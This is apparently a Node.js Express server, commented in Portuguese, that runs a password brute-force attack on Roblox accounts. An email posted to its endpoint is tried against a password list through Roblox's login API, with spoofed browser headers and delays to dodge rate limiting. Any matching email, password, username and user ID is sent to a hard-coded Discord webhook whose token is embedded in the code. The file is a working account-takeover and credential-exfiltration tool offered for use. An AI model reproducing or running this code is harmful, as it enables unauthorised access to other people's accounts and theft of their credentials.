const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// URL DO WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para enviar mensagem no Discord via Webhook
async function sendDiscordMessage(content) {
    try {
        await axios.post(WEBHOOK_URL, {
            content: content,
            username: "Roblox Brute Forcer",
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
        });
        console.log("✅ Mensagem enviada ao Discord!");
    } catch (e) {
        console.error("❌ Erro ao enviar msg no Discord:", e.message);
    }
}

// Função para tentar Login no Roblox (Método Atualizado)
async function tryRobloxLogin(email, password) {
    // Tentativa 1: Usar a API /users/login com JSON (Método Clássico)
    try {
        const client = axios.create({
            baseURL: 'https://www.roblox.com',
            timeout: 8000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/json; charset=utf-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.roblox.com/login'
            }
        });

        // 1. Pegar Cookies
        await client.get('/');

        // 2. Tentar Login
        const response = await client.post('/users/login', {
            username: email,
            password: password
        });

        if (response.data.id) {
            return { success: true, username: response.data.username, userId: response.data.id };
        } else {
            return { success: false, error: response.data.error || "Erro Desconhecido" };
        }
    } catch (e1) {
        // Se der erro, tenta o Método 2
        console.log("Método 1 falhou, tentando Método 2...");
    }

    // Tentativa 2: Usar a API /v1/users/login ou Form Data
    try {
        const client2 = axios.create({
            baseURL: 'https://www.roblox.com',
            timeout: 8000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.roblox.com/login'
            }
        });

        await client2.get('/');

        // Enviar como Form Data
        const formData = `username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
        
        const response2 = await client2.post('/users/login', formData);

        if (response2.data.id) {
            return { success: true, username: response2.data.username, userId: response2.data.id };
        } else {
            return { success: false, error: response2.data.error || "Erro Desconhecido" };
        }
    } catch (e2) {
        // Se os dois falharem, retorna o erro
        return { success: false, error: "Ambos os métodos falharam: " + e2.message };
    }
}

// FUNÇÃO PRINCIPAL: Ataque de Força Bruta
async function startBruteForce(email) {
    // 1. Ler o ficheiro de senhas
    let passwords = [];
    try {
        const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
        passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    } catch (e) {
        console.error("Erro ao ler senhas.txt:", e.message);
        await sendDiscordMessage(`**❌ ERRO NO ARQUIVO:** senhas.txt não encontrado ou vazio!`);
        return;
    }

    if (passwords.length === 0) {
        await sendDiscordMessage(`**❌ ERRO:** A lista de senhas está vazia!`);
        return;
    }

    console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);

    let found = false;

    // 2. Testar cada senha
    for (const password of passwords) {
        if (found) break;

        const result = await tryRobloxLogin(email, password);

        if (result.success) {
            found = true;
            const msg = `**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha Correta:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.userId}`;
            await sendDiscordMessage(msg);
            console.log("ENCONTRADA:", password);
        } else {
            // Enviar erro resumido apenas se quiseres ver todos (pode encher o Discord)
            // Descomenta a linha abaixo para ver cada erro
            // await sendDiscordMessage(`❌ **Falhou:** ${password} | ${result.error}`);
        }

        // Pausa para não bloquear o Email no Roblox (Rate Limit)
        await new Promise(r => setTimeout(r, 2000)); 
    }

    if (!found) {
        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}`);
    }
}

// ENDPOINT: Receber o Email do Site e Iniciar o Ataque
app.post('/start-brute-force', async (req, res) => {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
        return res.json({ success: false, error: "Email inválido" });
    }

    // Iniciar o ataque em "background"
    startBruteForce(email);

    // Retornar resposta imediata ao site
    return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
});

// INICIAR SERVIDOR
app.listen(port, () => {
    console.log(`✅ Servidor rodando na porta ${port}`);
});
